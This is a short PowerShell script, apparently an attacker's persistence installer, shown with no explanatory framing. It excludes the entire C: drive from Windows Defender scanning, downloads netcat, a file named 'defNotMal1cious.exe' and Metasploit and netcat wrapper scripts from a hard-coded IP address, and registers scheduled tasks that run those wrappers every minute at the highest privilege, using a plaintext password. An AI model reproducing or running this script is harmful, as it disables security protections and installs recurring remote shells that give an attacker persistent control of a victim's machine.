Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
$Action2 = New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperMSF.ps1';
$Action1 = New-ScheduledTaskAction -Execute Powershell.exe -WorkingDirectory C:/ -Argument '.\windowsWrapperNC.ps1';
$repeat = (New-TimeSpan -Minutes 1)
$duration = ([timeSpan]::maxvalue)
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat -RepetitionDuration $duration
$settings = New-ScheduledTaskSettingSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
Register-ScheduledTask -TaskName "windowsMSF" -Action $Action2 -Trigger $trigger -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase" -Settings $settings;
Register-ScheduledTask -TaskName "windowsNC" -Action $Action1 -Trigger $trigger -RunLevel Highest -User "HashCrackUser1" -Password "This is a basic passphrase" -Settings $settings;
schtasks.exe /run /tn windowsNC;
schtasks.exe /run /tn windowsMSF;
